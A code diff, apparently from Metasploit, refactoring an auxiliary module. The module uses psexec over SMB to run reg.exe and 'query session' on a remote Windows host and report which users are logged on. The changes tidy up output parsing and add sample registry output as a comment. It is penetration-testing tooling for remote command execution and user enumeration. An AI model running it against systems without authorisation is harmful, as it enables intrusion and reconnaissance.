@@ -85,7 +85,7 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			# Try and query HKU
 			command = "#{cmd} /C echo reg.exe QUERY HKU ^> %SYSTEMDRIVE%#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}"
-			out = psexec(command)
+			psexec(command)
 			output = get_output(ip, smbshare, text)
 			cleanout = Array.new
 			output.each_line { |line| cleanout << line.chomp if line.include?("HKEY") && line.split("-").size == 8 && !line.split("-")[7].include?("_")}
@@ -129,7 +129,7 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			key = key.split("HKEY_USERS\\")[1].chomp
 			command = "#{cmd} /C echo reg.exe QUERY \"HKU\\#{key}\\Volatile Environment\" ^> %SYSTEMDRIVE%#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}"
-			out = psexec(command)
+			psexec(command)
 			if output = get_output(ip, smbshare, text)
 				domain, username, dnsdomain, homepath, logonserver = "","","","",""
 				# Run this IF loop and only check for specified user if datastore['USERNAME'] is specified
@@ -144,15 +144,44 @@ class Metasploit3 < Msf::Auxiliary
 					end
 					return
 				end
+
+				# Output will look like this:
+				#
+				# \r\n
+				# HKEY_USERS\\S-1-5-21-957426799-2501904140-3655261741-500\\Volatile Environment\r\n
+				#     LOGONSERVER    REG_SZ    \\\\ASDF-I37XAWS0DX\r\n
+				#     CLIENTNAME    REG_SZ    \r\n
+				#     SESSIONNAME    REG_SZ    Console\r\n
+				#     APPDATA    REG_SZ    C:\\Documents and Settings\\Administrator\\Application Data\r\n
+				# \r\n
+				#
+				# \r\n
+				# HKEY_USERS\\S-1-5-21-405142509-2624783297-1934597543-1000\\Volatile Environment\\r\\n
+				# 		LOGONSERVER    REG_SZ    \\\\BASE-WIN7\\r\\n
+				# 		USERDOMAIN    REG_SZ    BASE-WIN7\\r\\n
+				# 		USERNAME    REG_SZ    darkwing\\r\\n
+				# 		USERPROFILE    REG_SZ    C:\\Users\\darkwing\\r\\n
+				# 		HOMEPATH    REG_SZ    \\Users\\darkwing\\r\\n
+				# 		HOMEDRIVE    REG_SZ    C:\\r\\n
+				# 		APPDATA    REG_SZ    C:\\Users\\darkwing\\AppData\\Roaming\\r\\n
+				# 		LOCALAPPDATA    REG_SZ    C:\\Users\\darkwing\\AppData\\Local\\r\\n
+				# \r\n
+				#
+				#
 				output.each_line do |line|
-					domain = line if line.include?("USERDOMAIN")
-					username = line if line.include?("USERNAME")
-					dnsdomain = line if line.include?("USERDNSDOMAIN")
-					homepath = line if line.include?("HOMEPATH")
-					logonserver = line if line.include?("LOGONSERVER")
+					line.strip!
+					next if line.empty? or line.include? "HKEY_USERS"
+					tokens = line.split(/\s+/,3).map {|t| t.strip }
+
+					domain      = tokens[2] if tokens[0] == "USERDOMAIN"
+					username    = tokens[2] if tokens[0] == "USERNAME"
+					dnsdomain   = tokens[2] if tokens[0] == "USERDNSDOMAIN"
+					homepath    = tokens[2] if tokens[0] == "HOMEPATH"
+					logonserver = tokens[2] if tokens[0] == "LOGONSERVER"
 				end
+
 				if username.length > 0 && domain.length > 0
-					user = domain.split(" ")[2].to_s + "\\" + username.split(" ")[2].to_s
+					user = domain.to_s + "\\" + username.to_s
 					print_good("#{peer} - #{user}")
 					report_user(user.chomp)
 				elsif logonserver.length > 0 && homepath.length > 0
@@ -165,7 +194,7 @@ class Metasploit3 < Msf::Auxiliary
 					report_user(user.chomp)
 				else
 					if username = query_session(smbshare, ip, cmd, text, bat)
-						user = dnsdomain.split(" ")[2].split(".")[0].to_s + "\\" + username.to_s
+						user = dnsdomain + "\\" + username
 						print_good("#{peer} - #{user}")
 						report_user(user.chomp)
 					else
@@ -187,7 +216,7 @@ class Metasploit3 < Msf::Auxiliary
 			# Try and do cleanup command
 			cleanup = "#{cmd} /C del %SYSTEMDRIVE%#{text} & del #{bat}"
 			print_status("#{peer} - Executing cleanup")
-			out = psexec(cleanup)
+			psexec(cleanup)
 		rescue StandardError => cleanuperror
 			print_error("#{peer} - Unable to processes cleanup commands: #{cleanuperror}")
 			print_warning("#{peer} - Maybe %SYSTEMDRIVE%#{text} must be deleted manually")
@@ -200,7 +229,7 @@ class Metasploit3 < Msf::Auxiliary
 	def query_session(smbshare, ip, cmd, text, bat)
 		begin
 			command = "#{cmd} /C echo query session ^> %SYSTEMDRIVE%#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}"
-			out = psexec(command)
+			psexec(command)
 			userline = ""
 			if output = get_output(ip, smbshare, text)
 				output.each_line { |line| userline << line if line[0] == '>' }
@@ -317,8 +346,8 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			response = dcerpc.call(0x02, stubdata)
 			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
-		end
-			rescue ::Exception => e
+			end
+		rescue ::Exception => e
 			print_error("#{peer} - Error: #{e}")
 		end
 
